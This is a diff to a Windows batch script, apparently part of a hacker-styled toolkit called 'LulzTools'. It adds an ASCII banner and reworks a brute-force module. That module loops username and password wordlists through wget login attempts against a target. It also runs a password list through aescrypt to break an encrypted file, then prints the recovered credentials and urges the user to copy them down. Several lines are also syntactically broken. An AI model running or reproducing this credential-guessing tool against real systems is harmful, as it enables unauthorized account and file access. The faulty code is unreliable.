@@ -1,6 +1,18 @@
 set version = Beta 0.1
+set branch = Master
 cls
-echo lulztools/main.bat> LulzTools %version%
+echo  __       __    __   __       ________  .___________.  ______     ______    __          _______.
+echo |  |     |  |  |  | |  |     |       /  |           | /  __  \   /  __  \  |  |        /       |
+echo |  |     |  |  |  | |  |     `---/  /   `---|  |----`|  |  |  | |  |  |  | |  |       |   (----`
+echo |  |     |  |  |  | |  |        /  /        |  |     |  |  |  | |  |  |  | |  |        \   \    
+echo |  `----.|  `--'  | |  `----.  /  /----.    |  |     |  `--'  | |  `--'  | |  `----.----)   |   
+echo |_______| \______/  |_______| /________|    |__|      \______/   \______/  |_______|_______/    
+echo.
+echo Version: %version%
+echo Branch: %branch%     
+echo.
+echo.
+echo.
 set Day=%Date:~7,2%
 set Month=%Date:~4,2%
 if %Day% == 04 (
@@ -423,21 +435,16 @@ echo +=======================================================================+
 set /p option=lulztools/main.bat:#_brute-force> Option: 
 if %option% == 0 then goto end
 cls
-set USR_LST=%2
-set PWD_LST=%3
-set TYPE=%4
-set INFO=%5
+set TYPE=%2
+set INFO=%3
+set LIST1=%4
+set LIST2=%5
 
 echo lulztools/main.bat:#h_brute-force> Cracking...
 
-if not %TYPE% == wget (
-	if not %TYPE% == aes (
-		goto end
-	)
-)
-
-FOR /F "skip=1 eol=> tokens=1 delims=" %%a IN (%USR_LST%) DO (
-	FOR /F "skip=1 eol=> tokens=1 delims=" %%b IN (%PWD_LST%) DO (
+if %TYPE% == wget (
+FOR /F "skip=1 eol=> tokens=1 delims=" %%a IN (%LIST1%) DO (
+	FOR /F "skip=1 eol=> tokens=1 delims=" %%b IN (%LIST2%) DO (
 		echo lulztools/main.bat:#h_brute-force> Trying to log in with %%a:%%b
 		if %TYPE% == wget (
 			echo lulztools/main.bat:#h_brute-force> Trying to log in with %%a:%%b
@@ -446,19 +453,26 @@ FOR /F "skip=1 eol=> tokens=1 delims=" %%a IN (%USR_LST%) DO (
 				echo lulztools/main.bat:#h_brute-force> Got username and password from %INFO%
 				echo lulztools/main.bat:#h_brute-force> Used: %%a:%%b
 				echo lulztools/main.bat:#h_brute-force> It is best to copy down the login data now
-			)
-		)
-		if %TYPE% == aes (
-			echo lulztools/main.bat:#h_brute-force> Trying to log in with %%b
-			aescrypt -d -p %%b %INFO%
-			if %ERRORLEVEL% == 0 (
-				echo lulztools/main.bat:#h_brute-force> Got password from %INFO%
-				echo lulztools/main.bat:#h_brute-force> Used: %%b
-				echo lulztools/main.bat:#h_brute-force> It is best to copy down the login data now
+				pause >nul
+				goto end
 			)
 		)
 	)
 )
+
+if %TYPE% == aes (
+	FOR /F "skip=1 eol=> tokens=1 delims" %%a in (%LIST1%) DO (
+		echo lulztools/main.bat:#h_brute-force> Trying to crack AES encryption with %%a
+		aescrypt -d -p %%a %INFO%
+		if %ERRORLEVEL% == 0 (
+			echo lulztools/main.bat:#h_brute-force> Got username and password from %INFO%
+			echo lulztools/main.bat:#h_brute-force> Used: %%a
+			pause >nul
+			goto end
+		)
+	)
+)
+echo lulztools/main.bat:#h_brute-force> Command not found
 
 :end
 echo lulztools/main.bat:end> Press any button to exit
